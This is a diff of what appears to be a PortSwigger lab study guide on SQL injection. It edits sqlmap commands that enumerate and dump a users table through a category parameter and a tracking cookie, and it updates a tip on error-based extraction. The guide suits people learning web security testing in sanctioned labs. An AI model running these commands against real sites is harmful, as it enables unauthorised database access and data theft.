@@ -397,7 +397,7 @@ TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encodin
 <sup>Using SQLMAP to enumerate tracking cookie.</sup>  
 
 ```bash
-sqlmap -v -r sqli-blind.txt --batch --random-agent --level=3 --risk=3 -p "TrackingId"
+sqlmap -v -r sqli-blind.txt --batch --random-agent --level=5 --risk=3 -p "TrackingId"
 ```  
 
 [PortSwigger Lab: SQL injection UNION attack, retrieving data from other tables](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)  
@@ -423,14 +423,14 @@ sqlmap -v -u 'https://TARGET.web.net/filter?category=*' -p "category" --batch --
 ```bash
 sqlmap -v -u 'https://TARGET.web.net/filter?category=*' -p "category" --batch --cookie="session=xnxxji87qhGxOdoGKKW1ack4pZxYJlTt" --random-agent --level=3 --risk=3 --dbms=PostgreSQL -D public --tables
 
-sqlmap -v -u 'https://TARGET.web-security-academy.net/filter?category=*' -p "category" --batch --cookie="session=xnxxji87qhGxOdoGKKW1ack4pZxYJlTt" --random-agent --dbms=PostgreSQL -D public -T users --dump --level=3 --risk=3
+sqlmap -v -u 'https://TARGET.web-security-academy.net/filter?category=*' -p "category" --batch --cookie="session=xnxxji87qhGxOdoGKKW1ack4pZxYJlTt" --random-agent --dbms=PostgreSQL -D public -T users --dump --level=5 --risk=3
 
 ```  
 
 ![SQLMAP used to dump data from tables](sqlmap-dump-table-data.png)
 
 
->Use SQLMAP Technique parameter as alternative to a blind boolean based vulnerability, and speed up data exfil process by doing error responses.  
+>Use SQLMAP Technique parameter set type to error based instead of boolean-based blind vulnerability, and this speed up data exfil process.  
 
 ```bash
 sqlmap -v -u 'https://TARGET.web.net/filter?category=*' -p 'category' --batch --flush-session --dbms postgresql --technique E --level=5  
